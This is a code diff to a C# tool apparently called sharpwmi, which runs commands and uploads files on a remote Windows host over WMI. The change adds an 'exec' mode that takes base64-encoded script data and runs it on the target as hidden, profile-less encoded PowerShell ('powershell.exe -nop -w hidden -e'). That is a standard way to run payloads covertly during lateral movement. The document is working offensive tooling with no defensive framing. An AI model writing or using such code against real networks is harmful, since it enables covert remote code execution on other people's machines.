@@ -61,12 +61,16 @@ namespace sharpwmi
                 string host = args[1];
                 string func_name = args[2];
                 string command = "";
+                string scriptdata = "";
                 string local_file = "";
                 string remote_file = "";
 
                 if (func_name == "cmd")
                 {
-                     command=args[3];
+                    command = args[3];
+                }
+                else if (func_name == "exec") {
+                    scriptdata = args[3];
                 }
                 else
                 {
@@ -139,10 +143,10 @@ namespace sharpwmi
                     Console.WriteLine("[+]Upload file done!");
                     return;
                 }
-                else if (args[3] == "exec")
+                else if (func_name == "exec")
                 {
-                    string cmd = args[4];
-                    ExecCmd(cmd);
+                    string powershell_command = "powershell.exe -nop -w hidden -e " + scriptdata;
+                    ExecCmd(powershell_command);
                     Console.WriteLine("[+]Exec finish!\n");
                 }
 
@@ -254,8 +258,9 @@ namespace sharpwmi
 
                 }
                 else if (args[3] == "exec") {
-                    string cmd = args[4];
-                    ExecCmd(cmd);
+                    string scriptdata = args[4];
+                    string powershell_command = "powershell.exe -nop -w hidden -e " + scriptdata;
+                    ExecCmd(powershell_command);
                     Console.WriteLine("[+]Exec finish!\n");
                 }
             }
